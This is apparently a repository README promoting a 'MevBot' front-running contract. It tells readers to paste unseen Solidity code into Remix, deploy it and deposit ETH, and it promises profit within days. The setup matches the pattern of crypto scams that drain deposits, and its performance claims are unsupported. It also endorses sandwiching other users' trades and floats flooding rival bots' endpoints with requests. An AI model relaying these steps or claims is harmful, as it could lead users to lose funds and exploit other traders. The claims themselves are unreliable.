# MevBot

My development is licensed. All rights reserved by the "HOLO" team (HOLO-Team/MevBot)
--------------
This screenshot are for informative purposes of our copyrights!
------------

Make money with MEV-bot (ChatGPT-4 source code)
--------

Update May 1st, 2023
---------
The contract is optimized. The "start" and "withdraw" functions require less gas.
---------

Frontrunning bots take advantage of users buying low liquidity coins on DEXes such as Uniswap, Sushiswap, and PancakeSwap. The frontrun bot scans the mempool, buys the coins faster than the pending transactions, and quickly resells it for a profit.

Although my commercial code is superior, the code being presented was not intended for public viewing. It was designed to be "tested in production" with numerous quality tradeoffs made. I had no intentions of releasing this code publicly as it could potentially "leak my alpha". Nevertheless, I would like to showcase the knowledge I have gained over the past few years.

Bot sends the Transaction and sniffs the Uniswap Mempool.

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity. It takes advantage of users buying low liquidity coins on DEXes including UniSwap, SushiSwap, and PancakeSwap.

After profiting, it sends back the ETH / BNB to the contract that you deployed where it is ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

**But ser, there are open source bots that do the same.**

Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as I went through their same pains and from a bot builder to a bot builder, i feel these guys. <3

**Wen increase aggressiveness ?**

As I've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.

**What did I learn?**

MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap.

**So why stop?**

I've made some profits from this but now I'm using some better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.

Towards the end, I found myself consistently being outcompeted by this person:

https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your success. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

But I will give you some competition.(ㆆ_ㆆ)

MEV bot Instructions
-------



(works only for Mainnet)
How it works:
----

create-a-frontrunner-bot-on-uniswap

You can see an example of how the bot works.

![holoteam1](https://user-images.githubusercontent.com/132253319/235498398-cb3b57ad-c887-4c4f-a174-67956604a0e8.png)

The bot will make transactions on your entire balance to increase profit

![234769046-932b596d-a133-4973-abff-2f97408bcd2d (1)](https://user-images.githubusercontent.com/132253319/235498693-c842fc13-afcf-4a32-830e-26318ceee183.png)



First-source code
-----
Access the Remix IDE (this website is where we deploy the smart contract): https://remix.ethereum.org/ 
-----------
FILE EXPLORER
---------
 and click and create new file "MevBot.sol"
Copy code and paste in Remix IDE

![1](https://user-images.githubusercontent.com/131911477/235358848-d58d3c89-4039-4ff4-8072-a8fcd0261380.png)


Click Solidity complier 0.6.6
------

And press Compile Mev Bot.sol

![2](https://user-images.githubusercontent.com/131911477/235358850-5293f561-0803-4a53-a594-b8dce684c7e1.png)


Select ETH or BSC(BNB) network
-----

and router address

Press Transact (Deploy)
-----
![3](https://user-images.githubusercontent.com/131911477/235358855-e4b0c076-b01c-4ec7-8ad7-744a709bcdbe.png)



Next - Deposit Balance into MEV Bot
------

Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the "Start" button.


![4](https://user-images.githubusercontent.com/131911477/235358872-c5484318-b71d-4069-91da-fd4c3b2e4cf5.png)

![4 1](https://user-images.githubusercontent.com/131911477/235358862-229cac84-2151-4248-994d-3c84e961adc9.png)

![5](https://user-images.githubusercontent.com/131911477/235358874-b49e89da-2206-4132-b1cf-6f154f6d0cb0.png)





Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.2-1 ETH.
----

At any time, you can "Stop" bot or return your money by calling the withdrawal function.
-----
